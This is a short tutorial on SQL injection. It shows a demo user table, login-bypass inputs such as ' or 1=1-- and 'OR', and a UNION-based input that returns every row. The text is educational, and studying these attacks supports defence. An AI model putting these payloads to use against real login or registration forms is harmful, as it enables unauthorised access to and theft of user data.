# SQL INJECTION

We are starting with simple example about the SQL Injection: Login Form (include username and password).
This website use the SQL query to check the login process: `select * from users where email = '<user_name_input>' and password = '<password_input>'`. So, if the user input: user@email.com/password' => The query is error and show on the log. The user can see it.
Therefore, we can log in this website by username/password: users/' or 1=1--
The SQL query in case is: 
```SQL
SELECT *
  FROM users
 WHERE email = 'user@email.com'
   AND pass  = '' or 1=1--' LIMIT 1
```

In all the content below, I will use table user to make a demo:
```SQL
create table user (id int, username varchar(255), password varchar(255));

insert into user values (1, 'admin1', '1234561');
insert into user values (2, 'admin2', '1234562');
insert into user values (3, 'admin3', '1234563');
insert into user values (4, 'admin4', '1234564');
insert into user values (5, 'admin5', '1234565');
```

## I. USUAL WAYS TO ATTACK
### 1. Login attack
With the SQL direct query for checking login:
```SQL 
select * from user where username = 'admin1' and password = '123456'
```
, we can user these username/password to attack: 'OR'/'OR'. With this input, we have the full query likes:
```SQL 
select * from user where username = '' OR '' and password = '' OR '' (always true)
```
In this case, the system will return all the data of table user

### 2. Select
This  attact is usually use with a registration form. The needed feature after register successfully is to show all the information registration. Type of query as:
```SQL
select * from user where user_name = 'admin1'
```
But with one of the input is: ' union select * from user --, the  SQL query becomes:
```SQL
select * from user where user_name='' union select * from user
```
In this case, the system will return all the data of table user
